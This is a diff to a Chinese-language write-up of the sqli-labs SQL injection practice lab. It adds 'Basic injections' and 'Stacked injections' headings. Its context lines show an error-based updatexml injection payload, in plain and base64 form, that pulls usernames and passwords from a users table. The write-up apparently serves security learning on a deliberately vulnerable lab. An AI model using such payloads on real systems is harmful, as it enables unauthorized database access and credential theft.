@@ -17,6 +17,8 @@ mysql版本:5.7.26
 
 
 
+## Basic injections
+
 ### less-1
 
 单引号闭合
@@ -1055,4 +1057,10 @@ uname=YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSwoc2VsZWN0IGdyb3VwX2NvbmNhdC
 # admin" and updatexml(1,concat(0x7e,substr((select group_concat(username,0x3a,password) from users),1,10),0x7e),1)#
 uname=YWRtaW4iIGFuZCB1cGRhdGV4bWwoMSxjb25jYXQoMHg3ZSxzdWJzdHIoKHNlbGVjdCBncm91cF9jb25jYXQodXNlcm5hbWUsMHgzYSxwYXNzd29yZCkgZnJvbSB1c2VycyksMSwxMCksMHg3ZSksMSkj
 ```
+
+
+
+## Stacked injections
+
+### less-23
 
